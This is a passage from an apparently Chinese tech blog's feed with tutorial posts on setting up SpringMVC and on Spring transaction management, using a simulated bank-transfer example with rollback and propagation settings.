    <content type="html"><![CDATA[<h1 id="SpringMVC概述"><a href="#SpringMVC概述" class="headerlink" title="SpringMVC概述"></a>SpringMVC概述</h1><ul><li>SpringMVC是一种基于Java实现MVC模型的轻量级Web框架</li><li>SpringMVC技术与Servlet技术功能等同，均属于web层开发技术</li></ul><h1 id="SpringMVC项目启动"><a href="#SpringMVC项目启动" class="headerlink" title="SpringMVC项目启动"></a>SpringMVC项目启动</h1><h2 id="导入SpringMVC坐标与Servlet坐标以及tomcat插件"><a href="#导入SpringMVC坐标与Servlet坐标以及tomcat插件" class="headerlink" title="导入SpringMVC坐标与Servlet坐标以及tomcat插件"></a>导入SpringMVC坐标与Servlet坐标以及tomcat插件</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">port</span>&gt;</span>80<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>/<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="创建SpringMVC控制器类"><a href="#创建SpringMVC控制器类" class="headerlink" title="创建SpringMVC控制器类"></a>创建SpringMVC控制器类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@RequestMapping(&quot;/save&quot;)</span></span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;user save...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>@ResponseBody 用于设置当前控制器方法响应内容为当前返回值，无需解析<h2 id="初始化SpringMVC环境，设定SpringMVC加载对应的bean"><a href="#初始化SpringMVC环境，设定SpringMVC加载对应的bean" class="headerlink" title="初始化SpringMVC环境，设定SpringMVC加载对应的bean"></a>初始化SpringMVC环境，设定SpringMVC加载对应的bean</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.kallen.controller&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="初始化Servlet容器，加载SpringMVC环境，并设置SpringMVC技术处理的请求"><a href="#初始化Servlet容器，加载SpringMVC环境，并设置SpringMVC技术处理的请求" class="headerlink" title="初始化Servlet容器，加载SpringMVC环境，并设置SpringMVC技术处理的请求"></a>初始化Servlet容器，加载SpringMVC环境，并设置SpringMVC技术处理的请求</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContainersInitConfig</span> <span class="keyword">extends</span> <span class="title class_">AbstractDispatcherServletInitializer</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> WebApplicationContext <span class="title function_">createServletApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">AnnotationConfigWebApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigWebApplicationContext</span>();</span><br><span class="line">    ctx.register(SpringMvcConfig.class);</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> WebApplicationContext <span class="title function_">createRootApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>AbstractDispatcherServletInitializer类是SpringMVC提供的快速初始化web3.0容器的抽象类</li><li>AbstractDispatcherServletInitializer提供三个接口方法供用户实现<ul><li>createServletApplicationContext()方法，创建Servlet容器时，加载SpringMVC对应的bean并放入WebApplicationContext对象范围中，而WebApplicationContext的作用范围为ServletContext范围，即整个web容器范围</li><li>getServletMappings()方法，设定SpringMVC对应的请求映射路径，设置为/表示拦截所有请求，任意请求都将转入到SpringMVC进行处理</li><li>createRootApplicationContext()方法，如果创建Servlet容器时需要加载非SpringMVC对应的bean，使用当点方法进行，使用方式同createServletApplicationContext()</li></ul></li></ul><h1 id="SpringMVC工作流程分析"><a href="#SpringMVC工作流程分析" class="headerlink" title="SpringMVC工作流程分析"></a>SpringMVC工作流程分析</h1><ul><li><p><strong>启动服务器初始化过程</strong></p><ul><li>服务器启动，执行ServletContainersInitConfig类，初始化web容器</li><li>执行createServletApplicationContext()方法，创建了WebApplicationContext对象</li><li>加载SpringMvcConfig</li><li>执行@ComponentScan加载对应的bean</li><li>加载UserController，每个@RequestMapping的名称对应一个具体的方法</li><li>执行getServletMappings方法，定义所有的请求都通过SpringMVC</li></ul></li><li><p>单次请求过程</p><ul><li>发送请求localhost/save</li><li>web容器发现所有请求都经过SpringMVC，将请求交给SpringMVC处理</li><li>解析请求路径/save</li><li>由/save匹配执行对应的方法save()</li><li>执行save()</li><li>检测到有@ResponseBody直接将sava()方法的返回值作为响应请求体返回给请求方</li></ul></li></ul><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/deda0682-f56c-469f-bdbd-c9bb46b2110a.png"></p><h1 id="Controller加载控制与业务bean加载控制"><a href="#Controller加载控制与业务bean加载控制" class="headerlink" title="Controller加载控制与业务bean加载控制"></a>Controller加载控制与业务bean加载控制</h1><ul><li>Spring容器和SpringMVC容器的bean需要分开加载<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(value = &quot;com.kallen&quot;,</span></span><br><span class="line"><span class="meta">    excludeFilters = @ComponentScan.Filter(</span></span><br><span class="line"><span class="meta">        type = FilterType.ANNOTATION,</span></span><br><span class="line"><span class="meta">        classes = Controller.class</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>excludeFilters:排除扫描路径中加载的bean，需要指定类别（type）与具体项（classes）</p></blockquote></li></ul><blockquote><p>includeFilters：加载指定的bean，需要指定类别（type）与具体项（classes）</p></blockquote><ul><li><p>bean的加载格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContainersInitConfig</span> <span class="keyword">extends</span> <span class="title class_">AbstractDispatcherServletInitializer</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> WebApplicationContext <span class="title function_">createServletApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">AnnotationConfigWebApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigWebApplicationContext</span>();</span><br><span class="line">    ctx.register(SpringMvcConfig.class);</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> WebApplicationContext <span class="title function_">createRootApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">AnnotationConfigWebApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigWebApplicationContext</span>();</span><br><span class="line">    ctx.register(SpringConfig.class);</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>简化开发</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContainersInitConfig</span> <span class="keyword">extends</span></span><br><span class="line">    <span class="title class_">AbstractAnnotationConfigDispatcherServletInitializer</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;SpringConfig.class&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;SpringMvcConfig.class&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SpringMVC概述&quot;&gt;&lt;a href=&quot;#SpringMVC概述&quot; class=&quot;headerlink&quot; title=&quot;SpringMVC概述&quot;&gt;&lt;/a&gt;SpringMVC概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;SpringMVC是一种基于Java实现MVC模型的轻量</summary>
      
    
    
    
    <category term="SpringMVC" scheme="https://kallenblue.github.io/categories/SpringMVC/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring-事务管理</title>
    <link href="https://kallenblue.github.io/2022/10/02/Spring/Spring-%E4%BA%8B%E5%8A%A1%E7%AE%A1%E7%90%86/"/>
    <id>https://kallenblue.github.io/2022/10/02/Spring/Spring-%E4%BA%8B%E5%8A%A1%E7%AE%A1%E7%90%86/</id>
    <published>2022-10-02T12:47:53.000Z</published>
    <updated>2022-10-03T12:22:27.049Z</updated>
    
    <content type="html"><![CDATA[<h1 id="事务简介"><a href="#事务简介" class="headerlink" title="事务简介"></a>事务简介</h1><ul><li><p>事务作用：在数据层保障一系列的数据库操作同成功同失败</p><blockquote><p>通过平台事务管理器来保障</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PlatformTransactionManager</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">(TransactionStatus status)</span> <span class="keyword">throws</span> TransactionException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rollback</span><span class="params">(TransactionStatus status)</span><span class="keyword">throws</span> TransactionException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事务案例：模拟银行账户间转账业务"><a href="#事务案例：模拟银行账户间转账业务" class="headerlink" title="事务案例：模拟银行账户间转账业务"></a>事务案例：模拟银行账户间转账业务</h2><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><blockquote><p>实现两个账户之间转账操作，A账户转钱，B账户加钱</p></blockquote></li><li><p>数据层提供基础操作，指定账户转钱（outMoney），指定账户加钱（inMoney）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Update(&quot;update account set property=property + #&#123;money&#125; where account_id = #&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">inMoney</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> <span class="type">int</span> id,<span class="meta">@Param(&quot;money&quot;)</span> Double money)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Update(&quot;update account set property=property-#&#123;money&#125; where account_id = #&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">outMoney</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> <span class="type">int</span> id,<span class="meta">@Param(&quot;money&quot;)</span> Double money)</span>;</span><br></pre></td></tr></table></figure></li><li><p>业务层提供转账操作（transferAccounts），调用转钱和加钱的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">transferAccounts</span><span class="params">(<span class="type">int</span> fromID, <span class="type">int</span> toID, <span class="type">double</span> money)</span> &#123;</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">f1</span> <span class="operator">=</span> accountDao.inMoney(toID,money);</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">f2</span> <span class="operator">=</span> accountDao.outMoney(fromID,money);</span><br><span class="line">  <span class="keyword">return</span> f1&amp;&amp;f2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>提供两个账号和操作金额执行转账操作</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccountApp</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(SpringConfig.class);</span><br><span class="line">    <span class="type">AccountService</span> <span class="variable">accountService</span> <span class="operator">=</span> applicationContext.getBean(AccountService.class);</span><br><span class="line"></span><br><span class="line">    accountService.transferAccounts(<span class="number">1</span>,<span class="number">2</span>,<span class="number">200</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><ul><li>程序正常执行时，转账正常</li><li>程序出现异常后，转账失败，但是异常之前的操作成功，异常之后的操作失败，整体业务失败，也就是会出现只转出了钱没收到钱或者只收到没转出<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">transferAccounts</span><span class="params">(<span class="type">int</span> fromID, <span class="type">int</span> toID, <span class="type">double</span> money)</span> &#123;</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">f1</span> <span class="operator">=</span> accountDao.inMoney(toID,money);</span><br><span class="line">  <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">f2</span> <span class="operator">=</span> accountDao.outMoney(fromID,money);</span><br><span class="line">  <span class="keyword">return</span> f1&amp;&amp;f2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>模拟异常</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>/<span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="Spring的事务管理"><a href="#Spring的事务管理" class="headerlink" title="Spring的事务管理"></a>Spring的事务管理</h2></li><li>在业务层接口上添加Spring事务管理@Transactional</li></ul><blockquote><p>Spring注解式事务通常添加在业务层接口中而不会添加到业务层实现类中，降低耦合<br>注解式事务可以添加到业务方法上表示当前方法开启事务，也可以添加到接口类上表示当前接口所有方法开启事务</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">transferAccounts</span><span class="params">(<span class="type">int</span> fromID,<span class="type">int</span> toID,<span class="type">double</span> money)</span>;</span><br></pre></td></tr></table></figure><ul><li>设置事务管理器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> PlatformTransactionManager <span class="title function_">transactionManager</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line">  <span class="type">DataSourceTransactionManager</span> <span class="variable">transactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceTransactionManager</span>();</span><br><span class="line">  transactionManager.setDataSource(dataSource);</span><br><span class="line">  <span class="keyword">return</span> transactionManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>事务管理器要根据实现技术进行选择<br>MyBatis框架使用的是JDBC事务</p></blockquote><ul><li>开启注解式事务驱动</li></ul><blockquote><p>在配置类中添加</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br></pre></td></tr></table></figure><h1 id="Spring事务角色"><a href="#Spring事务角色" class="headerlink" title="Spring事务角色"></a>Spring事务角色</h1><ul><li>事务角色<ul><li>事务管理员：发起事务方：在Spring中通常指代业务层开启事务的方法</li><li>事务协调员：加入事务方，在Spring中通常指代数据层方法，也可以是业务层方法</li></ul></li></ul><h1 id="事务配置"><a href="#事务配置" class="headerlink" title="事务配置"></a>事务配置</h1><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/f5098949-b030-4df9-8a56-b64bc36ef067.png"></p><blockquote><p>默认error和运行时异常会进行回滚，其他情况不回滚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">transferAccounts</span><span class="params">(<span class="type">int</span> fromID, <span class="type">int</span> toID, <span class="type">double</span> money)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">f1</span> <span class="operator">=</span> accountDao.inMoney(toID,money);</span><br><span class="line">  <span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">f2</span> <span class="operator">=</span> accountDao.outMoney(fromID,money);</span><br><span class="line">  <span class="keyword">return</span> f1&amp;&amp;f2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里抛出的异常为IOException，默认不会回滚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(rollbackFor = &#123;IOException.class&#125;)</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">transferAccounts</span><span class="params">(<span class="type">int</span> fromID,<span class="type">int</span> toID,<span class="type">double</span> money)</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure><blockquote><p>加上配置即可</p></blockquote><h1 id="事务传播行为"><a href="#事务传播行为" class="headerlink" title="事务传播行为"></a>事务传播行为</h1><blockquote><p>事务传播行为：事务协调员对事务管理员所携带事务的处理态度</p></blockquote><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><blockquote><p>和之前那个转账的案例一样，不过这次要求无论转账是否成功均需转账操作的日志</p></blockquote><ul><li>新建一个log表<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="built_in">log</span></span><br><span class="line">(</span><br><span class="line">    id   <span class="type">int</span> auto_increment</span><br><span class="line">        <span class="keyword">primary</span> key,</span><br><span class="line">    log  <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="type">time</span> <span class="type">timestamp</span>    <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li>LogDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">LogDao</span> &#123;</span><br><span class="line">  <span class="meta">@Update(&quot;insert into log (log, time) values (#&#123;log&#125;,now())&quot;)</span></span><br><span class="line">  <span class="type">boolean</span> <span class="title function_">addLog</span><span class="params">(String log)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>LogService<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">LogService</span> &#123;</span><br><span class="line">  <span class="meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span></span><br><span class="line">  <span class="type">boolean</span> <span class="title function_">addLog</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">double</span> money)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>为使Log事务成为一个全新的事务，需要在@Transactional里配置propagation = Propagation.REQUIRES_NEW</p></blockquote></li></ul><p>其他属性值如下<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79b10695-0b70-4e85-8f0b-932a4f12c472.png"></p><ul><li>Service实现类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 